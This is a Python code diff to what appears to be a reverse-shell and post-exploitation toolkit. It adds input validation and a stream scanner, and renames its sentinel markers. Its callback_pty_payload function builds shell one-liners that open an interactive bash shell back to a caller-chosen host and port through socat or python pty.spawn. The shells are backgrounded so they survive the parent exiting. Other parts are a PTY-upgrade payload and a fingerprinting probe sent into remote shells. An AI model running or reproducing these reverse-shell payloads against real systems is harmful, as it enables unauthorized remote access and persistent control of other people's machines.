@@ -5,11 +5,32 @@ import re
 import secrets
 import shlex
 
-from .session import Fingerprint, Session
+from ._scan import StreamScanner
+from .session import Session
 
-_SENTINEL_PREFIX = "@@MSFP"
+_SENTINEL_PREFIX = "@@PWFP"
 _BEGIN = f"{_SENTINEL_PREFIX}BEGIN@@"
 _END = f"{_SENTINEL_PREFIX}END@@"
+
+# Hosts get interpolated into shell + python one-liners (see callback_pty_payload),
+# so restrict them to the characters that appear in IPv4/IPv6 literals and DNS
+# names. A stray quote, space, or shell metacharacter is rejected rather than
+# silently producing a broken — or injectable — payload.
+_SAFE_HOST_RE = re.compile(r"^[A-Za-z0-9_.:-]{1,255}$")
+
+
+def validate_target(host: str, port: int) -> str | None:
+    """Return a human-readable error if (host, port) is unsafe, else ``None``."""
+    if not host or not _SAFE_HOST_RE.match(host):
+        return f"unsafe host {host!r} — expected an IP address or hostname"
+    try:
+        p = int(port)
+    except (TypeError, ValueError):
+        return f"port not an integer: {port!r}"
+    if not (1 <= p <= 65535):
+        return f"port out of range (1..65535): {p}"
+    return None
+
 
 _PROBE_SH = (
     f"echo {_BEGIN}; "
@@ -27,17 +48,22 @@ class Fingerprinter:
 
     def __init__(self, session: Session) -> None:
         self.session = session
-        self._buf = bytearray()
+        self._scan = StreamScanner()
+        self._begin = _BEGIN.encode()
+        self._end = _END.encode()
         self._done = asyncio.Event()
 
     def _on_data(self, session: Session, data: bytes) -> None:
-        self._buf.extend(data)
-        text = self._buf.decode("utf-8", errors="replace")
-        if _BEGIN in text and _END in text:
-            begin = text.index(_BEGIN) + len(_BEGIN)
-            end = text.index(_END, begin)
-            self._parse(text[begin:end])
-            self._done.set()
+        self._scan.feed(data)
+        i = self._scan.find(self._begin)
+        if i < 0:
+            return
+        start = i + len(self._begin)
+        stop = self._scan.find(self._end, start)
+        if stop < 0:
+            return
+        self._parse(self._scan.text(start, stop))
+        self._done.set()
 
     def _parse(self, block: str) -> None:
         lines = [ln.strip() for ln in block.splitlines() if ln.strip()]
@@ -64,7 +90,7 @@ class Fingerprinter:
             try:
                 await asyncio.wait_for(self._done.wait(), timeout=timeout)
                 return True
-            except asyncio.TimeoutError:
+            except TimeoutError:
                 return False
         finally:
             self.session.remove_data_hook(self._on_data)
@@ -106,10 +132,9 @@ def pty_upgrade_payload(
     After the upgrade, a second line runs stty + TERM + a sentinel echo inside
     the new PTY — if we see the sentinel come back, the upgrade worked.
     """
-    ready = f"@@MS_PTY_READY_{secrets.token_hex(4)}@@"
-    fail = f"@@MS_PTY_FAIL_{secrets.token_hex(4)}@@"
+    ready = f"@@PW_PTY_READY_{secrets.token_hex(4)}@@"
+    fail = f"@@PW_PTY_FAIL_{secrets.token_hex(4)}@@"
 
-    chosen_shell = shell or '"$SHELL"'
     if not shell:
         shell_expr = 'S="${SHELL:-/bin/bash}"'
     else:
@@ -151,11 +176,14 @@ def callback_pty_payload(host: str, port: int) -> str:
       1. socat   — cleanest: `tcp:HOST:PORT exec:/bin/bash,pty,stderr,setsid,sigint,sane`
       2. python3 — fresh socket + pty.spawn(["/bin/bash","-i"])
       3. python  — same as above for Python 2 hosts
-      4. fail marker — caller sees `@@MS_RECONNECT_FAIL@@` in scrollback
+      4. fail marker — caller sees `@@PW_RECONNECT_FAIL@@` in scrollback
 
     We background each via `(... &)` so the spawned proc is reparented to init
     and survives the original shell exiting.
     """
+    err = validate_target(host, port)
+    if err:
+        raise ValueError(err)
     h = host
     p = int(port)
     socat_cmd = (
@@ -180,7 +208,7 @@ def callback_pty_payload(host: str, port: int) -> str:
         f"({py3_cmd} >/dev/null 2>&1 &); "
         "elif command -v python >/dev/null 2>&1; then "
         f"({py2_cmd} >/dev/null 2>&1 &); "
-        "else echo @@MS_RECONNECT_FAIL@@; fi\n"
+        "else echo @@PW_RECONNECT_FAIL@@; fi\n"
     )
 
 
@@ -192,30 +220,30 @@ class PtyUpgrader:
         self.rows = rows
         self.cols = cols
         self.shell = shell
-        self._buf = bytearray()
+        self._scan = StreamScanner()
+        self._fail = b"@@PW_PTY_FAIL_"
         self._ok = asyncio.Event()
         self._failed = False
-        self._ready_marker = ""
+        self._ready_marker = b""
 
     def _on_data(self, s: Session, data: bytes) -> None:
-        self._buf.extend(data)
-        text = self._buf.decode("utf-8", errors="replace")
-        if "@@MS_PTY_FAIL_" in text:
+        self._scan.feed(data)
+        if self._scan.find(self._fail) >= 0:
             self._failed = True
             self._ok.set()
-        elif self._ready_marker and self._ready_marker in text:
+        elif self._ready_marker and self._scan.find(self._ready_marker) >= 0:
             self._ok.set()
 
     async def run(self, timeout: float = 6.0) -> tuple[bool, str]:
         """Returns (success, message)."""
         payload, marker = pty_upgrade_payload(self.rows, self.cols, shell=self.shell)
-        self._ready_marker = marker
+        self._ready_marker = marker.encode()
         self.session.add_data_hook(self._on_data)
         try:
             await self.session.send(payload.encode())
             try:
                 await asyncio.wait_for(self._ok.wait(), timeout=timeout)
-            except asyncio.TimeoutError:
+            except TimeoutError:
                 return (False, "no response — target may have no python/script, or isn't a shell")
             if self._failed:
                 return (False, "target has no python or script — PTY upgrade impossible from here")
